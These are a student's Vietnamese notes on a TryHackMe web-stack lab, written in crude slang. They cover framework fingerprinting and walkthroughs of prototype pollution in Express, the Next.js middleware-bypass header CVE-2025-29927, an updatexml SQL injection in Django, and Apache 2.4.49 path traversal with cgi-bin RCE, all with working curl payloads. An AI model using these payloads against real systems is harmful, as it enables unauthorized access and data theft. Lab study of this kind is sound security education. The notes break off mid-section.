# 1-Thực hành lại mấy cái lý thuyết bên dưới
[[TH-Modern Web Stacks I]]
# 2-MERN stack

### Nhận diện bộ công nghệ
MERN gần như là lựa chọn mặc định cho các dự án thuần JavaScript muốn dùng chung một ngôn ngữ cho toàn bộ hệ thống. <u>Trên môi trường Ubuntu, mô hình triển khai điển hình sẽ là Node.js cài từ NodeSource, Express chạy trên port 3000 hoặc 5000, và MongoDB dùng port 27017. </u>Khi đưa lên production, người ta thường đặt một reverse proxy (như Nginx) ở phía trước để làm rào chắn. Tuy nhiên, với các công cụ nội bộ hoặc khi cấu hình sai, luồng xử lý của Express thường bị phơi bày trực tiếp ra ngoài Internet.

> [!NOTE]
> mern  nó là bộ công cụ gồm để xây backend chạy thuần javascript
> ![[Pasted image 20260816143925.png|478]]

### Các dấu hiệu nhận biết MERN Stack

Trước khi tung ra bất kỳ payload tấn công nào, <u>bạn cần biết mình đang đối mặt với hệ thống gì.</u> Hãy bắt đầu bằng việc kiểm tra các HTTP header. Dưới đây là ba tín hiệu tố cáo một server đang chạy Express:
![[Pasted image 20260816204028.png]]
1. Header `X-Powered-By: Express` (Độ tin cậy cao)
2. Header Set-Cookie chứa `connect.sid` (Độ tin cậy cao)
3. Phản hồi lỗi `Cannot GET /nonexistent` ở dạng text thô khi truy cập một route không tồn tại (Độ tin cậy cao)

> [!NOTE]
> > <u>nói chung là tồn tại 3 dấu hiệu trên trong header thì mình biết nó là dùng Express cho backend</u>

`X-Powered-By: Express` là tín hiệu rõ ràng nhất vì framework này tự động gắn nó vào mọi response. Trừ khi lập trình viên chủ động tắt đi bằng lệnh `app.disable('x-powered-by')` hoặc dùng thư viện Helmet, còn không thì nó luôn ở đó. Tuy nhiên, các nền tảng đám mây hoặc reverse proxy thường sẽ tự động gỡ header này trước khi trả về cho client. Nếu không thấy nó, bạn có thể dựa vào hai dấu hiệu còn lại.

Cookie `connect.sid` được sinh ra bởi thư viện `express-session`. Nếu ứng dụng bật tùy chọn `saveUninitialized: true`, cookie này sẽ luôn hiện diện. Nhưng nếu dev cẩn thận set nó thành `false` (khuyến cáo cho các form đăng nhập), cookie sẽ chỉ xuất hiện khi session đã thực sự được tạo.

Dấu hiệu cuối cùng cực kỳ chắc chắn là cách server xử lý lỗi route. Hãy thử gọi đến một đường dẫn rác. Một ứng dụng Express mặc định sẽ trả về một trang hiển thị đúng một dòng chữ thuần túy: `Cannot GET /nonexistent`. Điểm này khác hẳn với kiểu báo lỗi hiển thị nguyên trang HTML của Django hay Next.js.
> <u>đọc đ hiểu gì, khi nào cần sẽ đọc laij, bây giờ chỉ cần hiểu cái này nó là bước recon để biết xem hệ thống nó có dùng Express hay ko</u>
### Khai thác ứng dụng MERN
#### Hack quyền Admin qua lỗ hổng Prototype Pollution (Cho dễ hiểu)
Sau khi mày ngửi thấy mùi con server đang chạy Express (port 3000) và có xài session cookie, việc tiếp theo là đi soi mấy cái API của nó. Bọn web xài MERN stack rất hay có trò mở API nhận file JSON để user tự đổi thông tin cá nhân. Để làm được việc này, mấy thằng dev hay tự chế ra các hàm gộp data (gọi là hàm `merge`). Và đm, code ngu ở cái hàm này chính là cái ổ đẻ ra lỗ hổng Prototype Pollution.

> [!NOTE]
> ><u>ok hiểu rồi, tức là lab ở đây tập trung vào việc dev nó viết hàm 'merge data gửi từ api' một cách ngu học</u>
> 

Nói thẳng luôn: Việc mày gửi data JSON qua phương thức POST đéo có gì sai cả, nó là giao tiếp mạng bình thường.<u> Lỗi là ở cách con server nuốt cục data đó!</u>
**Con web này có 2 cái API nhạy cảm:**
   * **`POST /api/user/update`**: Hứng cục JSON mày gửi lên, rồi gộp thẳng vào data tài khoản hiện tại của mày.
   * **`GET /api/admin/flag`**: Trả về cái cờ (flag) nếu nó check thấy mày có quyền admin.

> [!NOTE]
> > trước tiên cần hiểu tml api là cái gì đã [[API]]

Bình thường, mày lấy cái acc quèn gọi thẳng vào API lấy cờ thì nó chửi thẳng mặt `{"error":"Not authorized"}` ngay, vì trong data tài khoản của mày làm đéo có cái thuộc tính `isAdmin`.
![[Pasted image 20260816205436.png]]
Nhưng sang cái API update,<u> mày sẽ thấy thằng dev code cực ẩu</u>. <u>Mày gửi cái mả mẹ gì lên (tên, tuổi, email...), nó cũng nhận hết và nhét thẳng vào tài khoản mày mà đéo thèm rào trước đón sau.</u>

**Đòn chí mạng của JavaScript:**
Trong JS, object đéo nào cũng có một cái gốc chung gọi là `Object.prototype`. Khi cái hàm `merge` nhận được cục payload mày gửi có chứa cái từ khóa ma giáo `__proto__` (ví dụ: `{"__proto__": {"isAdmin": true}}`), thay vì update cho tài khoản của mày, nó lại vô tình ghi đè mẹ cái quyền `isAdmin` vào cái gốc `Object.prototype`.

```shell-session
root@tryhackme:~# curl -b cookies.txt -X POST http://10.49.132.56:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
{"status":"updated"}
```
Hậu quả vãi lồn: Từ giây phút đó, BẤT KỲ tài khoản đéo nào đang chạy trên con server đó cũng auto được dính cái quyền `isAdmin = true` này.
><u>đọc cái trên để hiểu cái thuộc tính __proto__ nó là thuộc tính chung của tất cả các object của js</u>
#### Quá trình hốc cờ thực tế
Nhìn cái hàm `merge` óc chó này đi:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // Đệ quy ngu học ở đây
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

```

Khi cục payload chứa chữ `__proto__` lọt vào vòng lặp, biến `target["__proto__"]` đéo trỏ vào tài khoản của mày nữa, mà nó chọc thủng đáy, trỏ thẳng xuống `Object.prototype` của toàn bộ hệ thống NodeJS. Thế là dòng lệnh tiếp theo nó tiêm thẳng cái `isAdmin = true` vào lõi server.
> <u>ok hiểu sương sương target là object bên phía server, còn source là do người dùng gửi lên.hàm trên nó viết óc chó, nó gộp thuộc tính của soure, với target mà đ cần biết cái thuộc tính của source nó là cái gì, ngay cả khi truyền vào thuộc tính `__proto__`</u>

**Lúc này ở API lấy cờ:**
```javascript
app.get('/api/admin/flag', (req, res) => {
  const currentUser = req.session.currentUser || {};
  if (currentUser.isAdmin) {
    res.json({ flag: '[REDACTED]' });
  } // ...

```

Mặc dù cái tài khoản `currentUser` của mày bản chất vẫn rỗng tuếch, nhưng khi hệ thống chạy đến dòng check `currentUser.isAdmin`, thằng JS tìm đéo thấy nên tự động tụt đường ống chạy xuống cái gốc (prototype chain) để tìm tiếp. Bùm! Nó bốc ngay được cái chữ `true` mà mày vừa cấy vào hệ thống lúc nãy.

Thế là mày qua mặt được vòng kiểm duyệt nhẹ như lông hồng và server ói cái cờ ra cho mày bú.

> [!NOTE]
> ok t hiểu sương sương r, nói chung là cái object cặc nào cũng có cái prototype, nó là cái thuộc tính ẩn đúngko, khi truy vấn tới 1 thuộc tính mà đéo có, nó sẽ đâm xuống tml thuộc tính prototype ý gì

# 3- REACT /NextJS
Thằng Express là nền móng của cái stack MERN mà tao với mày vừa giã xong. <u>Thằng Next.js được build đè lên nó,</u> nhét thêm mấy trò như *App Router*, *React Server Components* (RSC) với *middleware*. Chính mấy món đồ chơi này tự nhiên tạo ra một cái bề mặt tấn công to vãi l và nguy hiểm hơn nhiều.
### Nhận diện bộ công nghệ (Stack Identity)

Next.js giờ là trùm mẹ nó rồi trong mảng React production. Mấy cái web dashboard xịn xò hay portal khách hàng 3 năm đổ lại đây toàn xài nó. Trên Ubuntu, nó chạy như một tiến trình Node.js dưới quyền một user riêng (kiểu node hoặc www-data), thường được bật bằng lệnh npm start sau khi đã gõ npm run build. Cái App Router (có từ bản 13, mặc định từ bản 14) chính là thằng mở đường cho 2 con hàng CVE-2025-29927 và CVE-2025-55182.

Lưu ý: 2 con CVE này chỉ dính khi app chạy ở mode production (npm run build && npm start) thôi nhé. Ở mode dev (next dev) thì đéo dính đâu. Nếu lúc trinh sát mày thấy nó đang chạy server dev thì vứt, 2 con CVE này phế.

#### React Server Components và Giao thức Flight

App Router nó chạy React component trực tiếp trên server luôn. Thay vì ném mớ JS về cho trình duyệt, con server tự xử rồi bắn kết quả trả về client dưới một cái định dạng na ná binary gọi là giao thức RSC Flight. Cái luồng stream data này chính là cái lỗ hổng để mày đâm con CVE-2025-55182.

> [!NOTE]
> <u>nhưng t đ hiểu cái app router để làm cc j</u>
> ![[Pasted image 20260816211921.png]]

#### Trinh sát (Fingerprinting) Next.js

Cứ trinh sát passive trước đi, khoan vội ném payload khai thác.

```shell
root@tryhackme:~# curl -I http://MACHINE_IP:3001/
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000,
ETag: "1pqu4ojvif3at"
Content-Type: text/html; charset=utf-8
Content-Length: 4277
Connection: keep-alive
Keep-Alive: timeout=5 

```

Xong thì soi mấy cái dấu hiệu này:

* Header X-Powered-By: Next.js (Độ tin cậy cao)
* Mã nguồn HTML có thẻ script chứa `window.__next_f` (Độ tin cậy cao - chốt sổ luôn là có xài App Router)
* Đường dẫn file tĩnh: /_next/static/chunks/ (Độ tin cậy cao)
* Header của Middleware: x-middleware-next hoặc x-middleware-rewrite (Độ tin cậy trung bình)
* Bị đá văng (Redirect 307) về trang /login (Độ tin cậy trung bình)

Cái `window.__next_f` trong source code là bằng chứng rõ nhất của App Router. Nó là cái mảng data của React Server Component do thằng Next.js tự động tiêm vào mọi trang HTML. Bọn Pages Router hay mấy framework khác đéo bao giờ có cái chữ này.

### CVE-2025-29927: Bypass cái Middleware

Trong Next.js, <u>middleware là cái hàm chạy chặn đầu mọi request trước khi tới page. </u>Tụi dev hay dùng nó làm bảo vệ cổng: check auth, check session, hay redirect đều vứt vào đây hết. Do nó đứng chắn mọi ngả đường nên đây là chỗ phổ biến nhất để tụi nó làm trò phân quyền.

> [!NOTE]
> ><u>-ok middle ware cứ hiểu như lớp lọc request</u>

Đường dẫn /dashboard trong cái app này là ví dụ chuẩn cmnl. Middleware check xem mày có session cookie xịn không. Đéo có là nó sút mày về /login. Test thử xem nó có đang chặn không:

```shell
root@tryhackme:~# curl -v http://MACHINE_IP:3001/dashboard
Trying MACHINE_IP:3001...
Connected to MACHINE_IP port 3001
GET /dashboard HTTP/1.1
Host: MACHINE_IP:3001
Accept: /
/login 

```

Đấy, middleware hoạt động ngon. Đéo có cookie thì đéo có dashboard, bị sút thẳng về /login.*=> ok hiểu*

Giờ đến đoạn hack. Next.js nó xài một cái internal header tên là *x-middleware-subrequest* để chống vụ lặp vô hạn. Kh<u>i middleware tự gọi chính nó (kiểu forward request tới đường dẫn khác), Next.js tự nhét cái header này vào để báo hiệu "ê đéo chạy middleware cho cái request này nữa nhé".</u> Bản chất nó là cơ chế tối ưu và an toàn của hệ thống thôi.

> [!NOTE]
> -ok hiểu cái x-middleware-subrequest này để làm gì
> -ok t hiểu luôn là cái header này nó nằm ở request và nó được backend nhét vô request để ko chạy middleware cho cái request này
> -ok nhé, hiểu cmn là middle ware là thằng bảo vệ check mấy cái cookie, authentication của mấy bọn request đi vào hệ thống, nhưng mà có một lỗi óc chó là, request cứ chứa cái header củ l kia thì nó sẽ ko check nữa, mà cái header trên thì người dùng có thể gán được mới đau, cứ nhìn cái payload bên dưới là hiểu

<u>Lỗi ngu học nằm ở đây: Thằng Next.js đéo bao giờ check xem cái header x-middleware-subrequest này là do server nội bộ tự tạo hay do thằng ất ơ nào bên ngoài tự gửi vào.</u> Mày chỉ cần tự nhét cái header này vào request của mày, Next.js bị lừa tưởng đó là subrequest nội bộ và bỏ qua luôn bước chạy middleware. Thế là khâu check quyền coi như vứt sọt rác.

Cái giá trị của header này chính là đường dẫn của file middleware viết lặp lại 5 lần. Ví dụ file middleware.ts nằm ở thư mục gốc thì viết như này:

```text
root@tryhackme:~# curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://MACHINE_IP:3001/dashboard
...
Dashboard
Flag: [REDACTED]
...

```

> [!NOTE]
> <u>ok kết quả trả về, tao có thể thấy thằng dashboard hiện lên, bỏ qua khâu login, nhưng t vẫn chưa hiểu rõ lắm cái cơ chế bypass?</u>![[Pasted image 20260816202936.png]]

Xong cmn việc. Bypass toàn bộ middleware. <u>Request đi thẳng mẹ nó vào page dashboard và móc được flag ra dễ như ăn kẹo.</u>

Đấy chính là CVE-2025-29927, điểm CVSS 9.1 Critical đấy. Mọi con app Next.js xài middleware để chặn quyền đều bị bypass tanh bành chỉ bằng một cái header. Đéo cần tài khoản, đéo cần brute force hay session token cái lồn gì sất, chỉ cần một cái giá trị header mà Next.js nó tin tưởng mù quáng là ăn.

Lưu ý: Nếu app nó xài cấu trúc thư mục /src, thì cái giá trị header phải đổi thành src/middleware lặp lại 5 lần. Nhớ check kỹ xem file nó nằm ở gốc hay trong /src nhé.

### CVE-2025-55182: Đâm RCE trong Room riêng

Con CVE-2025-55182 này là lỗi RCE (chạy lệnh từ xa) đéo cần xác thực thông qua lỗ hổng insecure deserialization trong cái bộ phân tích giao thức RSC Flight. Nó dính trên Next.js 14 và 15.x đi kèm React 19, điểm CVSS 10.0 Critical kịch trần cmnl. Bọn Jackpot Panda đã xài trò này để đi từ lệnh whoami lên tới trộm thông tin và cắm Cobalt Strike cùng đợt với con CVE-2025-29927 luôn.

Có hẳn một cái room TryHackMe riêng để hướng dẫn mổ xẻ payload và cách detect: [CVE-2025-55182: React2Shell](https://tryhackme.com/room/react2shellcve202555182). Cái room đó sẽ nói sâu hơn về vụ deserialization của Flight protocol, dắt tay mày khai thác từ lúc rà quét đến lúc chạy lệnh ăn RCE. Bài hiện tại này tao chỉ tập trung vào vụ trinh sát fingerprinting thôi nên tao đéo nói sâu phần đó. Đọc kỹ đi rồi thực hành cho nó trôi.*=>ok bố hiểu r*

# 4-Django

Đm nghe tao thông não con hàng Django này nhé. Bê nguyên code của mày đéo sai một dấu phẩy nào. Đọc cho kỹ:

Mấy cái stack Express với Next.js tao với mày vừa giã toàn chạy trên nền Node.js. Giờ sang thằng Django, con hàng này là framework thuần Python mà bọn nhà nước, tòa soạn báo, hay mấy công ty có team dev Python cực kỳ khoái xài.

Bản chất thằng Django có một cái cục **ORM** (Object-Relational Mapping), đáng lẽ sinh ra để làm cái khiên chắn mẹ hết mấy đòn SQL Injection. Đa số là nó đỡ được. Nhưng đm, cái dở là khi mấy thằng dev ngáo đá thích đi tắt đón đầu, vứt mẹ cái ORM đi rồi nối chuỗi thẳng cái input của user vào câu lệnh SQL, hoặc bản thân cái ORM dính lỗi ở mấy đoạn code cũ nát, thì cái database coi như banh lồn, mở toang cửa cho anh em mình vào.
Con **CVE-2021-35042** chính là một cái lỗi SQL Injection như thế ở trong hàm query `order_by()` của Django. Nó được đánh giá CVSS 9.8 Critical (cực kỳ nghiêm trọng) và vãi lồn nhất là đéo cần tài khoản đăng nhập cũng quất được.

### Nhận diện hệ thống (Stack Identity)

Thằng Django này đang gánh một lượng lớn các app web viết bằng Python. Trên Ubuntu, nó hay chạy núp bóng Gunicorn hoặc cái server dev build sẵn của nó, thường cắm cờ ở port 8000. Cái trang quản trị admin ở đường dẫn `/admin/` với cái trò CSRF middleware gần như đéo bao giờ tắt ở mọi project Django. Chỉ cần soi thấy cái trang admin thôi là đủ tín hiệu chốt kèo rồi, chưa cần ném payload vội.

> [!NOTE]
> > <u>tao chưa hiểu phần này</u>

### Trinh sát (Fingerprinting) Django

Bắt đầu bằng trò check header cái app đang chạy:

```bash
root@tryhackme:~# curl -I "http://10.82.95.115:8000/products/"
HTTP/1.1 200 OK
Date: Sun, 03 May 2026 14:33:20 GMT
Server: WSGIServer/0.2 CPython/3.10.12
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 407
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=9vMaeHlURA0uOYnP9qB2BrDNTvNPoD0JPyecxWNxV7aohswgtAtBvwbLWaOTYIF7; expires=Sun, 02 May 2027 14:33:20 GMT; Max-Age=31449600; Path=/; SameSite=Lax

```

Chạy xong thì soi kỹ mấy cái dấu hiệu này:

* **Header Server**: `WSGIServer/0.2 CPython/X.X.X` (Độ tin cậy: Cao)
* **Tên Cookie**: `csrftoken` (Độ tin cậy: Cao)
* **Header X-Frame-Options**: `DENY` (Độ tin cậy: Cao)
* **Header X-Content-Type-Options**: `nosniff` (Độ tin cậy: Cao)
* **Header Referrer-Policy**: `same-origin` (Độ tin cậy: Trung bình)
* **Source HTML (ở mấy cái form POST)**: trường ẩn chứa `csrfmiddlewaretoken` (Độ tin cậy: Cực cao)

Cái trường ẩn `csrfmiddlewaretoken` là cái dấu vân tay uy tín nhất của thằng Django. Cái `CsrfViewMiddleware` của nó tự động bơm cái trường này vào mọi form POST. Mày cứ mò vào trang `/admin/` rồi view source kiểu đéo gì cũng thấy. Bọn Express, Rails hay Next.js đéo bao giờ có cái này.
Thêm nữa, cái combo 3 header `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, và `Referrer-Policy: same-origin` đi cùng nhau là dấu hiệu rõ ràng của `SecurityMiddleware` bên Django. Đéo có framework nào khác mặc định gộp combo này.

> [!NOTE]
> <u>nói chung là cứ recon bằng cacsh xem header, bí quá thfi ném vào AI nó detect cho</u>

### Phân tích App: Danh mục sản phẩm (Products Catalogue)

Con app chạy port 8000 này là một cái trang show hàng đơn giản. Vào `/products/` xem nó có cái mẹ gì:

```bash
root@tryhackme:~# curl -s "http://10.49.132.56:8000/products/"
<!DOCTYPE html>
<html>
<head><title>Products</title></head>
<body>
<h1>Products</h1>
<form method="get" action="">
  <input type="hidden" name="csrfmiddlewaretoken" value="w4VrwSsqEYpBZL4ROD1c4CgYbqw0zjZZeiXQVYGmkUjVDIce9k6wq7XvaORkbAkL">
  <input type="hidden" name="order" value="">
</form>
<ul>

  <li>Gadget B - $19.99</li>

  <li>Tool C - $4.99</li>

  <li>Widget A - $9.99</li>

</ul>
</body>
</html>

```

Có 2 điểm mấu chốt ở đây. Thứ nhất, có cái `csrfmiddlewaretoken` confirm chuẩn hàng Django. Thứ hai, form này có cái tham số `order`; tức là nó cho phép user tự chọn cột để sắp xếp (sort). Cắm cờ mẹ ở đây, cái tham số này chính là cái lỗ để anh em mình đút payload vào.

### Lỗ hổng CVE-2021-35042

Cái hàm xử lý cái trang `/products/` này nó ghép cái câu SQL bằng cách nhét mẹ cái tham số `order` thẳng vào mệnh đề `ORDER BY`:

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')

```

Mày nhét cái lồn gì vào `?order=` thì nó cũng hạ cánh thẳng vào cái nhánh `THEN` của câu SQL mà đéo có một màng lọc nào hết. Cái cấu trúc `CASE WHEN` này lúc đéo nào cũng đúng (`1=1`), nên cái nhánh `THEN` chắc chắn sẽ chạy. Thế là chết cụ mày rồi.

Kỹ thuật `updatexml()` khai thác cách thằng MySQL nôn ra lỗi XPath. Cái lệnh `updatexml(1, xpath_expr, 1)` sẽ báo lỗi nếu cái biểu thức XPath sai cấu trúc. Bằng cách bọc một câu `SELECT` vào trong tham số XPath cùng với cái hàm `concat(0x7e, ...)`, <u>thằng MySQL sẽ ói luôn kết quả truy vấn ra trong cái thông báo lỗi.</u> Cái mã `0x7e` chuyển ra chính là dấu `~`, đóng vai trò như một cái cọc tiêu để anh em mình nhìn vào là nhận ra ngay đoạn data cần bốc.
Khi con Django đang bật chế độ debug (`DEBUG = True`), nó sẽ hớ hênh phun hết mớ báo lỗi MySQL này vào cái giao diện lỗi HTTP 500.

> [!NOTE]
> <u> nói chung là cần bật debug mới được, cái này thuàn lab, mà tao cũng chưa hiểu cái updatexml là cái l j</u>

> **CẢNH BÁO:** Cái trò `updatexml()` này chỉ bú được khi file `settings.py` đang set `DEBUG = True`. Gặp mấy con app thực tế production nó gạt về `DEBUG = False` thì nó chỉ quăng ra cái trang báo lỗi 500 chung chung đéo có detail gì cả. Trong bài lab này thì debug đang bật, nhưng đi làm thực tế thì phải check kỹ cái này trước. Nếu nó tắt output lỗi thì phải chuyển qua xài Blind SQL Injection bằng thời gian (dùng lệnh `SLEEP()`).

#### Thực hành cướp cờ (Exploitation Walkthrough)

**Bước 1: Móc phiên bản MySQL**
Check xem đường đạn đi có chuẩn không bằng cách moi một cái giá trị cố định: phiên bản database. Cái biến hệ thống `@@version` lúc đéo nào cũng có sẵn và nó báo cho mày biết là payload của mày có chạy hay không. Cái trang lỗi 500 tiện thể nôn luôn cả phiên bản Django ra:

```bash
root@ip-10-82-126-238:~# curl -s "http://10.49.132.56:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
~8.0.45-0ubuntu0.22.04.1

```

Thấy cái dấu `~` ở đầu không? Đạn trúng cmn đích, database đã phản hồi. Mày đang chọc vào con MySQL 8.0. Cái trang lỗi 500 cũng khai luôn là nó đang xài Django Version: 3.2.4.

**Bước 2: Móc tên Database**
Giờ thì tìm xem con app nó đang xài database tên là gì:

```bash
root@ip-10-82-126-238:~# curl -s "http://10.49.132.56:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
~vuln_db

```

Tên cái database mục tiêu là `vuln_db`. Đây là ví dụ thôi, mày cầm cái info này ném vào mấy tool xịn như SQLMap để nó tự động vắt kiệt và dump sạch data cho mày.

> [!question]
> <u>-tại sao lại dùng update xml, tao vẫn chưa hiểu tại sao payloaf là vậy?</u>
> ![[Pasted image 20260816230253.png|691]]
> <u>-nếu order nó luôn được thực thi vởi 1=1 , thì tại sao ko truyền truy vấn  luôn trong biến order để sql injection?=> tại nó là dạng error based ....</u>
> ![[Pasted image 20260816230353.png]]
>  

 Trả lời câu hỏi cuối bài:
1. **What hidden form field in Django POST forms is a near-certain stack fingerprint?** (Cái trường ẩn nào trong form POST của Django gần như chắc chắn là dấu hiệu nhận biết hệ thống?)
$\rightarrow$ **`csrfmiddlewaretoken`**
2. **Using manual curl payloads, what is the name of the vulnerable database?** (Dùng mấy quả payload curl bằng tay, tên cái database dính lỗi là gì?)
$\rightarrow$ **`vuln_db`**

# 5-LAMP

(LAMP, MySQL, PHP) là một trong những cái web stack đời đầu và phổ biến mẹ nó nhất. Tụi nó xài nhiều vì toàn đồ open-source, ổn định và dễ cài. Linux làm hệ điều hành, <u>Apache gác cổng hứng web request</u>, <u>MySQL giữ database</u>, còn <u>PHP thì lo xử lý logic</u>. Bao nhiêu năm nay nó gánh còng lưng cái internet này, từ blog, forum đến app doanh nghiệp. <u>Kể cả bây giờ, đầy hệ thống cũ hoặc server thật vẫn ôm cái đống LAMP này vì nó lì đòn và dễ dùng</u>.

> [!NOTE]
> ><u>-LAM là viết tắt cho linux , apcahe , mysql,php</u>

### Nhận diện hệ thống (Stack Identity)

Trên con Ubuntu,<u> thằng Apache thường chạy ngầm dưới quyền user</u> `www-data`, ném file ra từ thư mục `/var/www/html`, và đá mấy cái request động sang cho PHP xử lý qua `mod_php` hoặc `PHP-FPM`. MySQL thì ôm data, PHP lo xử lý logic backend. Cái combo Linux, Apache, MySQL, PHP kinh điển này đẻ ra hằng hà sa số mấy cái bề mặt tấn công ối dồi ôi như: hớ hênh file PHP, lỗi lòi họng database, phân quyền file ngu, hoặc cấu hình Apache/PHP ngáo chó.

> [!NOTE]
> <u>-ok tức là mọi lưu lượng đi qua Apache, nó sẽ nhả html từ /var/www/html; nếu cần xử lý logic thì nó ném về backend cho php xử lý-đương nhiên là cần data từ mysql mới xử lý được</u>
> 

#### Trinh sát hệ thống LAMP (Fingerprinting)
Đầu tiên là bài check header. Thằng Apache có cái tật rất ngứa háng là lúc đéo nào cũng bô bô cái phiên bản của nó ra trong mọi phản hồi:

```text
root@tryhackme:~# curl -I http://MACHINE_IP:8080/
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html 

```

Thấy cái dòng `Server: Apache/2.4.49 (Unix)` không? Thế là quá đủ cho một cuộc tình. Đúng cái phiên bản chết tiệt này khớp khít lỗ đít với con hàng **CVE-2021-41773** chứ đéo lệch đi đâu được. Thằng Apache còn ngu tới mức lặp lại cái phiên bản này ở dưới đáy cái trang lỗi 404. Mày cứ thử gọi đại một cái đường dẫn đéo tồn tại xem nó nôn ra không:

> [!question]
> <u>-lúc đ nào cũng phải check header để nhận biết mấy cái webstack đang được dùng nhỉ?</u>

```python
root@tryhackme:~# curl -v http://MACHINE_IP:8080/nonexistent 2>&1
*   Trying MACHINE_IP:8080...
* TCP_NODELAY set
* Connected to MACHINE_IP (10.82.95.115) port 8080 (#0)
> GET /nonexistent HTTP/1.1
> Host: MACHINE_IP:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Sat, 02 May 2026 21:16:56 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 196
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
* Connection #0 to host MACHINE_IP left intact

```

Cái tín hiệu chốt hạ là thư mục `/cgi-bin/`. Nếu nó chửi `403 Forbidden` thì nghĩa là cái thư mục đó có tồn tại, chỉ là nó cấm mày xem danh sách file bên trong thôi, tức là `mod_cgi` đã được cấu hình. Còn nếu nó chửi `404` thì là đéo có gì hết. Để ăn được quả exploit này, bắt buộc phải có mặt thằng `mod_cgi`:

```python
root@tryhackme:~# curl -v http://MACHINE_IP:8080/cgi-bin/ 2>&1
*   Trying 10.82.95.115:8080...
* TCP_NODELAY set
* Connected to MACHINE_IP (10.82.95.115) port 8080 (#0)
> GET /cgi-bin/ HTTP/1.1
> Host: MACHINE_IP:8080
> User-Agent: curl/7.68.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 02 May 2026 21:19:21 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 199
< Content-Type: text/html; charset=iso-8859-1
< 
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
* Connection #0 to host MACHINE_IP left intact

```

> [!NOTE]
> <u>ok đơn giản là thế này, tức là giống kiểu khám phá thư mục thôi, nếu trả về 403 thì tức là nó có cái thư mục đấy .Bên trên là check xem cái /cgi_bin có tồn tại hay ko</u>
> - Và cai /cgi_bin chính là mấu chốt để khai thác cái cve bên dưới

Xong xuôi thì check mấy cái dấu hiệu này:
* **Header Server**: `Apache/2.4.49 (Unix)` (Độ tin cậy: Kịch trần - Khớp đúng con CVE).
* **Đáy trang lỗi 404**: Lòi ra chuỗi phiên bản `Apache/2.4.49` (Độ tin cậy: Kịch trần).
* **Phản hồi từ `/cgi-bin/**`: Báo `403 Forbidden` chứ đéo phải 404 (Độ tin cậy: Cao - Xác nhận mod_cgi đang bật).

### Lỗ hổng CVE-2021-41773

Lên bản 2.4.49, bọn dev Apache táy máy sửa mẹ cái hàm `ap_normalize_path()`. Cái trò sửa ngu này vô tình làm hỏng cmn cái màng lọc chống Path Traversal (lội ngược thư mục). Bình thường, Apache nó sẽ chặn họng bất kỳ cái URL nào có chứa `../` trước khi cho chạm vào hệ thống file. Lỗi ở đây là thứ tự giải mã (decode) bị ngu: nó cho cái màng lọc chạy mẹ nó trước khi URL được giải mã hoàn toàn.

Khi mày gửi `.%2e/` (một dấu chấm, theo sau là chữ `%2e` được encode từ dấu chấm, rồi đến dấu gạch chéo), cái màng lọc nhìn vào thấy `.%2e/` đéo giống `../` nên nó nhắm mắt cho qua. Đến khi Apache ném cái URL này xuống cho hệ điều hành, OS nó tự hiểu `.%2e/` chính là `../`. Thế là màng lọc bị bypass, mày lội ngược thư mục cái một!

> [!NOTE]
> <u>-cái này khá giống bypass blacklist, thông thường apache có màng lọc chặn url có *.../*</u>
> <u>-nhưng mà có lỗi ở hàm trên, là cái url chưa giải mã hoàn toàn thì đã cho đi qua màng lọc rồi, nên nó không lọc được .%2e == ../</u>

Bản thân cái trò này mới chỉ là chọc ngoáy đọc file (directory traversal for file read) thôi. Cái làm nên độ nguy hiểm vãi lồn của nó là khi nó kết hợp với thằng `mod_cgi`. Cái đường dẫn `/cgi-bin/` cho phép chạy lệnh CGI. Khi mày dùng trò lội ngược thư mục trỏ thẳng tới một cái file thực thi như `/bin/sh`, thằng Apache sẽ ngu ngơ đem nó ra chạy như một đoạn script CGI và bơm luôn cái nội dung HTTP POST body của mày vào `stdin` (đầu vào tiêu chuẩn) của cái script đó. Bùm! RCE.

> [!question]
> <u> - thứ nhất là mod_cgi là gì ?trong một ứng dụng  sử dụng apache ,php đều cso cái thư mục này à,  đường dẫn /cgi-bin/ </u>
> ![[Pasted image 20260818132150.png]]

#### Tại sao đéo có cờ `--path-as-is` thì ăn lz?

